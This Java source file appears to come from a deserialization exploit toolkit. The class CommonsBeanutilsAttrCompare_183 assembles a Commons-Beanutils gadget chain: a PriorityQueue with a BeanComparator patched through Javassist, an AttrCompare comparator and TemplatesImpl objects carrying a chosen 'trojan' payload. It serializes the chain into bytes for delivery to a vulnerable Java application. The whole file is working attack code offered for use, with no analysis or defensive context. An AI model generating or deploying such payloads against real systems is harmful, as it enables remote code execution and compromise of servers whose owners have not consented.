package core.gadgets;

import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import core.enumtypes.PayloadType;
import core.gadgets.utils.Gadgets;
import core.gadgets.utils.JavassistClassLoader;
import core.gadgets.utils.Reflections;
import core.utils.Util;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;

import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;


public class CommonsBeanutilsAttrCompare_183 {

    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(type, trojanType);

        AttrNSImpl attrNS1 = new AttrNSImpl();
        CoreDocumentImpl coreDocument = new CoreDocumentImpl();
        attrNS1.setValues(coreDocument,"1","1","1");

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        final Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();
        Reflections.setFieldValue(beanComparator, "comparator", new AttrCompare());

//        StandardExecutorClassLoader classLoader = new StandardExecutorClassLoader("1.9.2");
//        Class u = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
//        System.out.println(u.getPackage());


//        Object beanComparator = u.getDeclaredConstructor(String.class, Comparator.class).newInstance(null, new AttrCompare());

//        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<?>) beanComparator);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<? super Object>) beanComparator);


        queue.add(attrNS1);
        queue.add(attrNS1);


        Reflections.setFieldValue(queue, "queue", new Object[] { templates, templates });

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
//        Reflections.setFieldValue(beanComparator, "comparator",  new AttrNSImpl());

        return (Queue)queue;
    }

    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        Object val = getObject(type, trojanType);
        return Util.serialize(val);
    }
}
